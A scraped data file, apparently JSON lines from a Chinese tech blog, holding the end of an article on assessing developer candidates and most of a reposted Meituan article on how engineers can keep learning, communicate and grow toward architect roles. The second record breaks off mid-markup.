你干活不看手册不查文档吗？聪明人从不死记硬背。<strong>重要的地方在于对问题域的准确、深刻的理解，对各类技术优劣点、各种条件平衡的评判和把握。</strong></p>\n<p>对待初阶新人，<strong>应着重考察的是基本功是否扎实，专业成绩是否优秀。更重要的，是他对职业的热情，学习能力和研究精神。</strong>某类人要说起技术来，滔滔不绝，两眼放光，充满热情，对未知的、新生的各类概念、技术非常好奇，这种人想差都难。因为他会自我驱动，不用督促，自己就钻研前进。反之，觉得这个职业待遇高，只是想混饭吃的人，很少走得长远。这类初阶新人以毕业生、工作年限少者为多。测试考核，可以笔试查看其对基础概念的理解是否准确，知识领域的大致范围。甚至，布置一个有点挑战性的小任务，让他尝试解决，说明思路。</p>\n<p><strong>考察胜任、精通者的策略不一样</strong>。笔试做题没啥用，原因前面说了。这类招聘是重头戏，企业都喜欢找这样的，能干活。所以考核评估的地方也较多。我觉得可以分成几个方面去看。<strong>意识是否先进，是否会反省思考；是否善于解决问题，富有创造性；是否有比较深的积累和广阔的知识面。</strong></p>\n<p>业界的开发思想也是在不断变化，工具链一直在革新。聪明的人不用蛮力，而爱用工具提升效率，喜欢自动化操作解放人力。<strong>要查看人用什么开发工具链，用什么开发环境，解释下为什么？</strong>好的开发者会及时注意新出现的工具，挖掘它能解决什么问题，并尝试吸收，解决自己的需求。如果没有这个思想意识，工作效率就会打折扣了。因为你会落后行业发展水平。人善于自我反省，则会催动自我纠正，这正是精通者的特征。参考：<a href=\"https://acejoy.com/2018/03/02/%E4%BC%98%E7%A7%80%E7%9A%84%E5%BC%80%E5%8F%91%E8%80%85%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%AD%A6%E4%B9%A0%E7%A0%94%E7%A9%B6%E6%96%B0%E7%9A%84%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%EF%BC%9F/\" target=\"_blank\" rel=\"noopener\"><em><strong>优秀的开发者为什么要学习研究新的编程语言？</strong></em></a></p>\n<p>解决问题的能力是重头戏，也是企业招聘人的主因。人要善于解决实际问题，而且，要学会聪明的解决问题。解决问题要看思路，看手段，看是否有创造性，这是真正考验人能力的地方。好的开发者，会考虑很多可能选项，预估各种优劣，给出一个较优的方案。 遇到难题，会用各种方法尝试。经验丰富的人，常常会使用技术的组合手段来处理难题，而不是一个语言一个工具到处用。所以，<strong>要查看下过往的项目经历遇到的问题、困难，是如何解决的，思路如何。</strong>一些公司据说不招聘不会用谷歌的工程师。谷歌打不开？嘿嘿，这就是你要克服的困难啊。这你都解决不了，还做什么研发。谷歌是人类最全、最新知识的总索引，充分利用事半功倍。</p>\n<p><strong>考察知识的深度、广度，对重要领域的概念是否有深刻的理解和掌握，以及从各类工作经验中得到的认知。</strong>问问他看过什么书，研究过什么东西。说白了，知道的东西是否多。一些公司很喜欢用CheckList模式来考核，列一堆领域的知识点、概念，问人懂不懂，知道就是水平好，不懂就是水平差。实际情况并非如此。人的工作过程是独立的，一些事情如果没有工作机会去接触并解决，那么一些冷僻的问题就永远都碰不上。当然也就不知道。但你能说没做过就一定做不好么？</p>\n<p>另外，人的技能树，其实也是“犬牙交错、参差不齐”的。什么意思？技术领域非常的广阔，你真的没办法每个领域都很精通，实际上是这个做的多，懂的多，那个用的少，知道的少。这个时候，应看具体知识领域，是哪一类。它是否需要复杂的、难度较高的背景。门槛高的技术，需要的配套技能多得多，比如<strong>AI、机器学习</strong>。而一般产品应用领域则不然，了解核心概念、设计意图，看着手册、最佳实践，也就能上手了。这个暂时不会，实际无关紧要的，工作一段学的认真点就会了。但是门槛高的领域，就需要很长时间的学习了。这是本质的差别。</p>\n<p>我曾看见某公司放出的职员技能树，包罗万象，几乎一切IT领域的知识技能都在里面了，还声称要求“全部精通”。我不知道它如何定义的“精通”，如果按德雷福斯模型的定义，能做到的那是神，不是人类。这个纯属吹牛皮，我压根就不信。如果真有这样的人，出来让我膜拜下。因为每个稍大点的领域，都足够让你钻研一辈子，因为它们也在迅速发展呀。业内流传“<strong>全栈工程师</strong>”的说法，鼓吹自己是全栈的人经常是前端工程师。而研究后端工作领域的技术高手经常鄙视这类人：真以为会点Node.js就能解决一堆后端的事务了么？我也懂一些前端，也能号称“全栈”，但在不同领域的专业性是什么水准，自己明白的很。前端要解决的事情也有很多复杂性。全栈实际是反专业化的，是人力资源稀缺时候的低成本选择。</p>\n<p>更高一层，则是考察人本身了。人的视野够广阔么？其它领域的知识有了解吗？一些问题的解答并不在问题域本身，而是在外面的领域。所谓“<strong>功夫在诗外</strong>”。公司讲求团队协作，总要面临不同的分工合作问题。比如产品、运营的人提需求，可以换位思考吗？合作意识强么？谁也不想招个刺头进来吧？把团队的气氛和人际关系搞的一团糟，大家做事都不痛快、不顺心，又如何安心做好工作？最终只能让团队工作效率下降，甚至瓦解。</p>\n<p>要说专家，实际上有研究者认为是需要刻意练习+充分实践才能功成。并不是每个人经过足够的工作年限，都自动成为专家。有的人工作10年，可能后面9年都在重复第一年的工作任务，毫无改进。而职业上的训练机会，又跟大环境乃至运气息息相关，并不是每个人都有机缘的。但是把个人的职业技能做到胜任乃至精通，则是完全可行的，这只需要认真和勤奋，工作态度问题。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113923\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113923votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113923\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "职场,技术,能力", "url": "http://blog.jobbole.com/113923/", "url_obj_id": "cc046f39bd58bd3436d2a6869083d93a"}
{"front_img_url": ["http://jbcdn2.b0.upaiyun.com/2014/08/f969ef7109b8aec9d66834db8eac2ca5.jpg"], "title": "工程师如何在工作中提升自己?", "create_date": "2018/04/17 ·", "praise_num": 2, "fav_num": 2, "comment_num": 0, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://tech.meituan.com/study_vs_work.html\">meituan</a>   </div><h1 id=\"-\">引言</h1>\n<p>古人云：“活到老，学到老。”互联网算是最辛苦的行业之一，“加班”对工程师来说已是“家常便饭”，同时互联网技术又日新月异，很多工程师都疲于应付，叫苦不堪。以至于长期以来流传一个很广的误解：35岁是程序员工作的终点。</p>\n<p>如何在繁忙的工作中做好技术积累，构建个人核心竞争力，相信是很多工程师同行都在思考的问题。本文是我自己的一些总结，试图从三个方面来解答：</p>\n<ul>\n<li>第一部分阐述了一些学习的原则。任何时候，遵循一些经过检验的原则，都是影响效率的重要因素，正确的方法是成功的秘诀。提升工作和学习效率的另一个重要因素是释惑和良好心态。</li>\n<li>第二部分分析了我在工作中碰到和看到的一些典型困惑。</li>\n<li>成为优秀的架构师是大部分初中级工程师的阶段性目标。第三部分剖析架构师的能力模型，让大家对目标所需能力有一个比较清晰的认知。</li>\n</ul>\n<h1 id=\"-\">如何学习</h1>\n<p>在繁忙的工作中，持之以恒、不断学习和进步是一件艰巨的任务，需要坚强的毅力和坚定的决心。如果方法不得当，更是事倍功半。幸好我们的古人和现在哲人已经总结了很多优秀的学习方法论，这里汇总了一些重要原则。遵循这些方法必会对大家的工作学习大有裨益。</p>\n<h2 id=\"-\">贵在坚持</h2>\n<p>有报道指出，过去几十年的知识量超过之前人类几千年的知识量总和。而计算机领域绝对是当代知识更新最快的领域之一，因此，工程师必须要接受这样一个现实，现在所掌握的深厚知识体系很快就会被淘汰。要想在计算机领域持续做优秀架构师，就必须不停的学习，掌握最新技术。总之，学不可以已。</p>\n<p>所谓“冰冻三尺，非一日之寒，水滴石穿，非一日之功”，通往架构师的道路漫长而又艰巨，轻易放弃，则所有付出瞬间付之东流。要想成为优秀的架构师，贵在坚持！</p>\n<p>虽然知识更新很快，但是基础理论的变化却非常缓慢。这就是“道”和“象”关系，纵是世间万象，道却万变不离其宗。对于那些非常基础的理论知识，我们需要经常复习，也就是“学而时习之”。</p>\n<h2 id=\"-\">重视实践</h2>\n<p>古人云：“纸上得来终觉浅，绝知此事要躬行。” 学习领域有所谓721模型：个人的成长70%来自于岗位实践，20%来自向他人学习，10%来自于培训。虽然这种理论存在争议，但对于工程师们来说，按照实践、学习和培训的方式进行重要性排序，大致是不错的。所以重视实践，在实践中成长是最重要的学习原则。</p>\n<p>人类的认知有两种：感性认知和理性认知。这两种认知互相不可替代性。实践很大程度来自于感性学习，看书更像是理性学习。以学开汽车做例子，很难想象什么人能够仅仅通过学习书本知识就会开汽车。</p>\n<p>书本知识主要是传道——讲述抽象原型，而对其具体应用场景的讲述往往含糊其辞，对抽象原型之间的关系也是浅尝辄止。采用同样精确的语言去描述应用场景和关联关系将会失去重点，让人摸不着头脑。所以，仅仅通过看书来获得成长就像是用一条腿走路。</p>\n<p>重视实践，充分运用感性认知潜能，在项目中磨炼自己，才是正确的学习之道。在实践中，在某些关键动作上刻意练习，也会取得事半功倍的效果。</p>\n<h2 id=\"-\">重视交流</h2>\n<p>牛顿说：“如果说我看得比别人远一些，那是因为我站在巨人的肩膀上。”我们需要从别人身上学习。从老师、领导、同事、下属甚至对手身上学习，是快速成长的重要手段。</p>\n<p>向老师和领导学习已经是人们生活习惯的一部分了。但是从同事甚至对手那里学习也很重要，因为这些人和我们自身更相似。所以要多多观察，取其所长，弃其所短。对于团队的小兄弟和下属，也要“不耻下问”。</p>\n<p>此外，在项目中积极参与具体方案讨论也非常重要。参与者先验感知了相关背景，并且讨论的观点和建议也是综合了发言者多种知识和技能。所以，讨论让参与者能够非常全面，立体地理解书本知识。同时，和高手讨论，他们的观点就会像修剪机剪树枝一样，快速的剪掉自己知识领域里面的疑惑点。</p>\n<h2 id=\"-\">重视总结和输出</h2>\n<p>工程师在实践中会掌握大量细节，但是，即使掌握了所有细节，却没有深刻的总结和思考，也会陷入到“学而不思则罔”的境地。成长的“量变”来自于对细节的逐渐深入地把控，而真正的“质变”来自于对“道”的更深层次的理解。</p>\n<p>将经验输出，接受别人的检验是高层次的总结。这种输出不仅帮助了别人，对自身更是大有裨益。总结的方式有很多，包括组织分享，撰写技术文章等等。当然“日三省吾身”也是不错的总结方式。总之，多多总结，多多分享，善莫大焉！</p>\n<p>解答别人的问题也是个人成长的重要手段。有时候，某个问题自己本来不太懂，但是在给别人讲解的时候却豁然开朗。所以，“诲人不倦”利人惠己。</p>\n<h2 id=\"-\">重视规划</h2>\n<p>凡事预则立，不预则废。对于漫长的学习生涯而言，好的计划是成功的一半。</p>\n<h3 id=\"-\">长期规划</h3>\n<p>长期规划的实施需要毅力和决心，但是做正确的长期规划还需要高瞻远瞩的眼界、超级敏感的神经和中大奖的运气。对于大部分人来说，长期规划定主要是“定方向”。但遵循如下原则能够减少犯方向性错误的概率：</p>\n<ul>\n<li>远离日暮西山的行业。</li>\n<li>做自己感兴趣的事情。</li>\n<li>做有积累的事情。</li>\n<li>一边走一边看，切勿一条道走到黑。</li>\n</ul>\n<h3 id=\"-\">短期规划</h3>\n<p>良好的短期规划应该在生活、成长、绩效和晋升之间取得平衡。大部分公司都会制定一个考核周期——少则一个月，多则一年。所以不妨以考核周期作为短期学习规划周期。本质上，规划是一个多目标优化问题，它有一系列的理论方案，这里不一一细说。基于相关理论，我给出一个简单易行的方案：</p>\n<ul>\n<li>确定目标优先级。比如：成长、生活、绩效。</li>\n<li>确定每个目标的下限。从优化理论的角度来看，这被称为约束。比如绩效必须在一般以上，之前已经规划好的旅行不能更改，必须读完《Effective Java》等等。</li>\n<li>优先为下限目标分配足够的资源。比如，事先规划好的旅行需要10天，这10天就必须预算出去。</li>\n<li>按照各主目标的顺序依次分配资源。比如，最终分配给学习的时间是10天。</li>\n<li>在给定的学习预算下，制定学习目标，要激进。然后给出执行方案。比如，学习目标是掌握基本的统计学知识，并成为Java专家。具体方案为：完成《Effective Java》、《Java Performance》、《Design Pattern》、《Head First Statistics》四本书的阅读。</li>\n<li>对规划中的各学习任务按目标优先级进行排序，并最先启动优先级最高的任务。比如，最高优先级是掌握统计理论，那么就要先看《Head First Statistics》。</li>\n</ul>\n<p>对于该方案，要注意以下几点：</p>\n<ul>\n<li>最低目标必须能够轻松达成的目标，否则，从优化理论的角度来讲，该命题无解。比如，类似“半年内完成晋级两次、绩效全部S、从菜鸟成为Java专家”就不太合适作为最低目标。总之，要区分理想和梦想。</li>\n<li>主要目标规划必须具备一定的挑战性，需要规划出不可能完成的目标。过度规划本质上是一种贪婪算法，目的是目标价值最大化。因为一切皆有变数，如果其他目标能够提前完成，就不妨利用这些时间去完成更多的学习目标。总之，前途必须光明，道路必须坎坷。</li>\n<li>各目标之间不一定共享资源，规划不一定互有冲突。</li>\n</ul>\n<p>此外，短期规划还可以从如下几个方面进行优化：</p>\n<ul>\n<li>学习计划最好能结合工作计划，理论联系实际结合，快速学以致用。比如，本季度规划去做一些数据分析工作，那么不妨把学习目标设置为学习统计知识。</li>\n<li>要灵活对待规划的目标和具体执行步骤，需要避免“郑人买履”式的笑话。面临新的挑战和变化，规划需要不断地调整。</li>\n</ul>\n<h1 id=\"-\">那些令人纠结的困惑</h1>\n<p>人生是一场马拉松，在漫长的征途中，难免有很多困惑。困惑就像枷锁，使我们步履蹒跚，困惑就像死锁，让我们停滞不前。</p>\n<p>接下来我将总结自己在工作中碰到和看到的一些典型困惑。这些困惑或者长期困扰作者本人，或者困扰我身边的同事和朋友。当这些困惑被释然之后，大家都感觉如重获释，为下一阶段的征程提供满满的正能量。人生就像一场旅途，不必在乎目的地，在乎的，应该是沿途的风景，以及看风景的心情。良好的心态是技术之旅最好的伴侣。期望通过这个解惑之旅，让大家拥有一个愉快的心情去感受漫长的学习旅途。</p>\n<h2 id=\"-\">学无止境吗</h2>\n<p>必须要承认一个残酷的现实：人的生命是有限的，知识却是无限的。用有限的生命去学习无限的知识是不可能完成的任务。一想到此，有些工程师不免产生一些悲观情绪。如果方法得当并且足够勤奋，悲伤大可不必。</p>\n<p>虽然，人类的整体知识体系一直在扩张。但是就很多重要的工程细分领域，基础理论并不高深。计算机的很多重要领域，工程师有能力在有限时间内抓住核心要害。</p>\n<p>比如，密码学被认为是门非常高深的学科，但是一大类密码技术的基础是数论中一个非常简单的理论——素因数分解：给出两个素数，很容易算出它们的积，然而反过来给定两个素数的积，分解的计算量却非常惊人。</p>\n<p>“一致性”算得上是计算机领域里面最经典的难题，它是所有分布式系统的基础，从多核多CPU到多线程，从跨机器到跨机房，无所不在，几乎所有的计算机从业人员都在解决这个问题，但是Paxos给出了一个很优雅的解决方案。</p>\n<p>权限管理是很多工程师的噩梦，但如果你能搞定“Attribute Based Access Control(ABAC)”和“Role-Based Access Control(RBAC)”，也能达到相当高度。</p>\n<p>另外，技术学习是一场对抗赛，虽然学无止境，超越大部分对手就是一种胜利。所以，以正确的学习方式，长时间投入就会形成核心竞争力。</p>\n<h2 id=\"-\">没有绝对高明的技术，只有真正的高手</h2>\n<p>致力于在技术上有所成就的工程师，都梦想有朝一日成为技术高手。但技术高手的标准却存在很大的争议。这是一个有着悠久历史的误解：以某种技术的掌握作为技术高手的评判标准。我经常碰到这样一些情景：因为掌握了某些技术，比如Spring、Kafka、Elasticsearch等，一些工程师就自封为高手。有些工程师非常仰慕别的团队，原因竟是那个团队使用了某种技术。</p>\n<p>这种误解的产生有几个原因：首先，技多不压身，技术自然是掌握的越多越好，掌握很多技术的人自然不是菜鸟。其次，在互联网时代来临之前，信息获取是非常昂贵的事情。这就导致一项技能的掌握可以给个人甚至整个公司带来优势地位。互联网时代，各种框架的出现以及开源的普及快速淘汰或者降低了很多技能的价值，同时降低了很多技术的学习门槛。所以，在当前，掌握某项技能知识只能是一个短期目标。怀揣某些技能就沾沾自喜的人需要记住：骄傲使人退步。</p>\n<p>所谓麻雀虽小，五脏俱全。如果让你来做造物主，设计麻雀和设计大象的复杂度并没有明显区别。一个看起来很小的业务需求，为了达到极致，所需要的技术和能力是非常综合和高深的。真正的高手不是拿着所掌握的技术去卡客户需求，而是倾听客户的需求，给出精益求精的方案。完成客户的需求是一场擂台赛，真正的高手，是会见招拆招的。</p>\n<h2 id=\"-\">不做项目就无法成长吗</h2>\n<p>在项目中学习是最快的成长方式之一，很多工程师非常享受这个过程。但是一年到头都做项目，你可能是在一家外包公司。对于一个做产品的公司，如果年头到年尾都在做项目，要不然就是在初步创业阶段，要不然就是做了大量失败的项目，总之不算是特别理想的状态。正常情况，在项目之间都会有一些非项目时间。在这段时间，有些同学会产生迷茫，成长很慢。</p>\n<p>项目真的是越多越好吗？答案显然是否定的。重复的项目不会给工程师们带来新的成长。不停的做项目，从而缺乏学习新知识的时间，会导致“做而不学则殆”。真正让工程师出类拔萃的是项目的深度，而不是不停地做项目。所以，在项目之间的空档期，工程师们应该珍惜难得的喘息之机，深入思考，把项目做深，做精。</p>\n<p>如何提高项目的深度呢？一般而言，任何项目都有一个目标，当项目完成后，目标就算基本达成了。但是，客户真的满意了吗？系统的可用性、可靠性、可扩展性、可维护性已经做到极致了吗？这几个问题的答案永远是否定的。所以，任何一个有价值的项目，都可以一直深挖。深挖项目，深度思考还可以锻炼工程师的创造力。期望不停地做项目的人，就像一个致力于训练更多千里马的人是发明不出汽车的。锻炼创造力也不是一蹴而就的事情，需要长时间地思考。总之，工程师们应该总是觉得时间不够用，毕竟时间是最宝贵的资源。</p>\n<h2 id=\"-\">职责真的很小吗</h2>\n<p>很多时候，一个工程师所负责系统的数量和团队规模与其“江湖地位”正相关。但是，江湖地位与技术成长没有必然关联。提升技术能力的关键是项目深度以及客户的挑剔程度。项目越多，在单个项目中投入的时间就越少，容易陷入肤浅。特别需要避免的是“ 在其位不谋其政”的情况。团队越大，在管理方面需要投入的精力就越多。在管理技巧不成熟，技术眼界不够高的前提强行负责大团队，可能会导致个人疲于应付，团队毫无建树。最终“ 一将无能，累死三军”，效果可能适得其反。</p>\n<p>从技术发展的角度来说，技术管理者应该关注自己所能把控的活跃项目的数量，并致力于提高活跃项目的影响力和技术深度。团队人数要与个人管理能力、规划能力和需求把控能力相适应。一份工作让多个人来干，每个人的成长都受限。每个人都做简单重复的工作，对技术成长没有任何好处。团队管理和项目管理需要循序渐进，忌“拔苗助长”。</p>\n<h2 id=\"-\">一定要当老大吗</h2>\n<p>有一些工程师的人生理想是做团队里的技术老大，这当然是一个值得称赞的理想。可是，如果整个团队技术能力一般，发展潜力一般，而你是技术最强者，这与其说是幸运，不如说是悲哀。这种场景被称之为“武大郎开店”。 团队里的技术顶尖高手不是不能做，但为了能够持续成长，需要满足如下几个条件：</p>\n<ul>\n<li>首先你得是行业里面的顶尖专家了——实在很难找到比你更强的人了！</li>\n<li>其次，你经常需要承担对你自己的能力有挑战的任务，但同时你拥有一批聪明能干的队友。虽然你的技术能力最高，但是在你不熟悉的领域，你的队友能够进行探索并扩展整个团队的知识。</li>\n<li>最后，你必须要敏而好学，不耻下问。</li>\n</ul>\n<p>否则，加入更强的技术团队或许是更好的选择，最少不是什么值得骄傲的事情。</p>\n<h2 id=\"-\">平台化的传说</h2>\n<p>平台化算得上是“高大上”的代名词了，很多工程师挤破头就为了和“平台化”沾点边。然而和其他业务需求相比，平台化需求并没有本质上的区别。无论是平台化需求还是普通业务需求，它的价值都来自于客户价值。不同点如下：</p>\n<ul>\n<li>很多平台化需求的客户来自于技术团队，普通需求的客户来自于业务方。</li>\n<li>产品经理不同。普通业务需求来自于产品经理，平台化需求的产品经理可能就是工程师自己。长期被产品经理“压迫”的工程师们，在平台化上终于找到“翻身农奴把歌唱”的感觉。</li>\n<li>很多平台化的关注点是接入能力和可扩展性，而普通业务的关注点更多。</li>\n</ul>\n<p>归根结底，平台化就是一种普通需求。在实施平台化之前，一定要避免下面两个误区：</p>\n<ul>\n<li>平台化绝对不是诸如“统一”、“全面”之类形容词的堆砌。是否需要平台化，应该综合考虑：客户数量，为客户解决的问题，以及客户价值是否值得平台化的投入。</li>\n<li>平台化不是你做平台，让客户来服务你。一些平台化设计者的规划设计里面，把大量的平台接入工作、脏活累活交给了客户，然后自己专注于所谓“最高大上”的功能。恰恰相反，平台化应该是客户什么都不做，所有的脏活累活都由平台方来做。本质上讲，平台化的价值来自于技术深度。真正体现技术深度的恰恰是设计者能够很轻松的把所有的脏活累活搞定。</li>\n</ul>\n<p>所以平台化的最佳实践是：投入最少的资源，解决最多的问题。平台解决一切，客户坐享其成。</p>\n<h2 id=\"-\">搞基础技术就一定很牛吗</h2>\n<p>经常听到同学们表达对基础技术部同学的敬仰之情，而对搞业务技术的同学表现出很轻视，认为存储、消息队列、服务治理框架（比如美团点评内部使用的OCTO）、Hadoop等才能被称为真正的技术。事实并非如此，更基础的并不一定更高深。</p>\n<p>比如下面这个流传很久的段子：越高级的语言就越没有技术含量。但真是这样吗，就拿Java和C来说，这是完全不同的两种语言，所需要的技能完全不同。C或许跟操作系统更加接近一点，和CPU、内存打交道的机会更多一点。但是为了用好Java，程序员在面向对象、设计模式、框架技术方面必须要非常精通。Java工程师转到C方向确实不容易，但作者也见过很多转到Java语言的C工程师水土不服。</p>\n<p>基础技术和业务应用技术必然会有不同的关注点，没有高低之分。之所以产生这种误解，有两个原因：</p>\n<ul>\n<li>基础技术相对成熟，有比较完整的体系，这给人一个高大上的感觉。业务应用技术相对来说，由于每个团队使用的不一样，所以成熟度参差不齐，影响力没有那么大。</li>\n<li>基础技术的门槛相对来说高一点，考虑到影响面，对可靠性、可用性等有比较高的最低要求。但是门槛高不代表技术含量高，另外成熟技术相对来说在创新方面会受到很大的约束。但是最先进的技术都来自活跃的创新。</li>\n</ul>\n<p>对比下来，业务技术和基础技术各有千秋。但真正的高手关注的是解决问题，所有的技术都是技能而已。</p>\n<h2 id=\"-\">可行性调研的那些坑</h2>\n<p>工作中开展可行性调研时有发生。做可行性调研要避免如下情况：</p>\n<ul>\n<li>把可行性调研做成不可行性调研。这真的非常糟糕。不可行性的结论往往是：因为这样或者那样的原因，所以不可行。</li>\n<li>避免“老鼠给猫挂铃铛”式的高风险可行性方案。“天下大事必作于细”，可行性调研一定要细致入微，避免粗枝大叶。</li>\n<li>避免调研时间过长。如果发现调研进展进入到指数级复杂度，也就是每前进一步需要之前两倍的时间投入，就应该果断的停止调研。</li>\n</ul>\n<p>可行性调研的结论应该是收益与成本的折衷，格式一般如下：</p>\n<ul>\n<li>首先明确预期的结果，并按照高中低收益进行分级。</li>\n<li>阐述达成每种预期结果需要采取的措施和方案。</li>\n<li>给出实施各方案需要付出的成本。</li>\n</ul>\n<h2 id=\"-\">工程师天生不善沟通吗</h2>\n<p>实际工作中，沟通所导致的问题层出不穷。工程师有不少是比较内向的，总是被贴上“不善沟通”的标签。实际上，沟通能力是工程师最重要的能力之一，良好的沟通是高效工作学习的基础，也是通过学习可以掌握的。下面我按工程师的语言说说沟通方面的经验。</p>\n<p>第一类常见的问题是沟通的可靠性。从可靠性的角度来讲，沟通分为TCP模式和UDP模式。TCP模式的形象表述是：我知道你知道。UDP模式的形象表述是：希望你知道。TCP模式当然比较可靠，不过成本比较高，UDP模式成本低，但是不可靠。在沟通可靠性方面，常见错误有如下两种：</p>\n<ul>\n<li>经常听到的这样的争论。一方说：“我已经告诉他了”，另一方说：“我不知道这个事情呀”。把UDP模式被当作TCP模式来使用容易产生扯皮。</li>\n<li>过度沟通。有些同学对沟通的可靠性产生了过度焦虑，不断的重复讨论已有结论问题。把TCP模式当成UDP来使用，效率会比较低。</li>\n</ul>\n<p>第二类沟通问题是时效性问题。从时效性讲，沟通分为：同步模式和异步模式。同步沟通形象地说就是：你现在给我听好了。异步沟通的形象表述是：记得给我做好了。在沟通时效性方面，有如下两种常见错误：</p>\n<ul>\n<li>已经出现线上事故，紧急万分。大家你一言，我一语，感觉事故可能和某几个人有关，但是也不能完全确定，所以没有通知相关人员。最终，一个普通的事故变成了严重事故。对于紧急的事情，必须要同步沟通。</li>\n<li>半夜三点你正在熟睡，或者周末正在逛街，接到一个电话：“现在有个需求，能否立刻帮忙做完。”这会非常令人郁闷，因为那并不是紧急的事情。不是所有的需求都需要立刻解决。</li>\n</ul>\n<p>有效沟通的一个重要原则是提前沟通。沟通本质是信息交流和处理，可以把被沟通对象形象地比喻成串行信息处理的CPU。提前沟通，意味着将处理请求尽早放入处理队列里面。下面的例子让很多工程师深恶痛绝：一个需求策划了1个月，产品设计了2周。当开发工程是第一次听说该需求的时候，发现开发的时间是2天。工程师据理力争，加班加点1周搞定。最后的结论是工程师非常不给力，不配合。就像工程师讨厌类似需求一样。要协调一个大项目，希望获得别人的配合，也需要尽早沟通。</p>\n<p>有效沟通的另外一个重点是“不要跑题”。很多看起来很接近的问题，本质上是完全不同的问题。比如：一个会议的主题是“如何实施一个方案”，有人却可能提出“是否应该实施该方案”。 “如何实施”和“是否应该实施”是完全不同的两个问题，很多看起来相关的问题实际上跑题很远。“跑题”是导致无效沟通的重要原因。</p>\n<p>良好沟通的奥秘在于能掌握TCP模式和UDP模式精髓，正确判断问题的紧急性，尽量提前沟通，避免跑题。</p>\n<h2 id=\"-\">带人之道</h2>\n<p>有些初为导师的工程师由于担心毕业生的能力太弱，安排任务时候谆谆教诲，最后感觉还是有所顾虑，干脆自己写代码。同样的事情发生在很多刚刚管理小团队的工程师身上。最终的结果他们：写完所有的代码，让下属无代码可写。“ 事必躬亲”当然非常糟糕，最终的往往是团队的整体绩效不高，团队成员的成长很慢，而自己却很累。</p>\n<p>古人说：“用人不疑，疑人不用。”这句话并非“放之四海而皆准”。在古代，受限于通信技术，反馈延迟显著，而且信息在传递过程中有大量噪音，变形严重。在这种情况下，如果根据短期内收集的少量变形的信息做快速决断，容易陷于草率。在公司里，这句话用于选人环节更为恰当，应该改为：录用不疑，疑人不录。</p>\n<p>考虑到招聘成本，就算是在录用层面，有时候也无法做到。作为一个小团队的管理者，能够快速准确的获取团队成员的各种反馈信息，完全不需要“用人不疑，疑人不用”。用人的真正理论基础来自于“探索和利用”(Exploration and Exploitation )。不能因为下属能做什么就只让他做什么，更不能因为下属一次失败就不给机会。</p>\n<p>根据经典的“探索和利用”(Exploration and Exploitation )理论，良好的用人方式应该如下：</p>\n<ul>\n<li>首选选择相信，在面临失败后，收缩信任度。</li>\n<li>查找失败的原因，提供改进意见，提升下属的能力。</li>\n<li>总是给下属机会，在恰当地时机给下属更高的挑战。 总之，苍天大树来自一颗小种子，要相信成长的力量。</li>\n</ul>\n<h2 id=\"-\">效率、效率、效率</h2>\n<p>经常看到有些同学给自己的绩效评分是100分——满分，原因是在过去一段时间太辛苦了，但最终的绩效却一般般。天道酬勤不错，但是天道更酬巧。工程师们都学过数据结构，不同算法的时间复杂度的差距，仅仅通过更长的工作时间是难以弥补的。为了提升工作学习效率，我们需要注意以下几点：</p>\n<ul>\n<li>主要关注效率提升。很多时候，与效率提升所带来的收益相比，延长时间所带来的成果往往不值得一提。</li>\n<li>要有清晰的结果导向思维。功劳和苦劳不是一回事。</li>\n<li>做正确的事情，而不仅仅正确地做事情。这是一个被不断提起的话题，但是错误每天都上演。为了在规定的时间内完成一个大项目，总是要有所取舍。如果没有重点，均匀发力，容易事倍功半。如果“南辕北辙”，更是可悲可叹。</li>\n</ul>\n<h1 id=\"-\">架构师能力模型</h1>\n<p>前面我们已经讲完了原则和一些困惑，那么工程师到底应该怎么提升自己呢？</p>\n<p>成为优秀的架构师是大部分初中级工程师的阶段性目标。优秀的架构师往往具备七种核心能力：编程能力、调试能力、编译部署能力、性能优化能力、业务架构能力、在线运维能力、项目管理能力和规划能力。</p>\n<p>这几种能力之间的关系大概如下图。编程能力、调试能力和编译部署能力属于最基础的能力。不能精通掌握这三种能力，很难在性能优化能力和业务架构能力方面有所成就。具备了一定的性能优化能力和业务架构能力之后，才能在线运维能力和项目管理能力方面表现优越。团队管理能力是最高能力，它对项目管理能力的依赖度更大。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/04/525d40d185c5f8b8d9b2f4274fba5c8d.png\"><img class=\"aligncenter size-full wp-image-113899\" src=\"http://jbcdn2.b0.upaiyun.com/2018/04/525d40d185c5f8b8d9b2f4274fba5c8d.png\" alt=\"architect_abilities\"></a></p>\n<h2 id=\"-\">编程能力</h2>\n<p>对工程师而言，编程是最基础的能力，必备技能。其本质是一个翻译能力，将业务需求翻译成机器能懂的语言。</p>\n<p>提升编程能力的书籍有很多。精通面向对象和设计模式是高效编程的基础。初级工程师应该多写代码、多看代码。找高手做Code Review，也是提升编程水平的捷径。</p>\n<h2 